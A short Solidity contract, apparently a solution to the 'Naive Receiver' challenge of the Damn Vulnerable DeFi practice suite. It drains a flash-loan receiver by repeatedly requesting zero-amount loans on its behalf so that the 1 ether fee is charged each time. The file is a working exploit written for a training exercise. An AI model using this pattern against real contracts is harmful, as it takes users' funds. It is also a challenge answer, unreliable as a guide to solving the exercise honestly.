// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../2_naive-receiver/FlashLoanReceiver.sol";

interface INaiveReceiverLenderPool { 
  function flashLoan(address borrower, uint256 borrowAmount) external;
}

/**
 * @title Naive-Receiver attacker
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract NaiveAttacker {
  address payable user;
  uint256 FIXED_FEE = 1 ether;
  INaiveReceiverLenderPool pool;


  constructor(address payable _user, address _pool){
    user = _user;
    pool = INaiveReceiverLenderPool(_pool);
  }

  function attack() public {
    while(user.balance != 0) {
      pool.flashLoan(user,0);
    }
  }
}
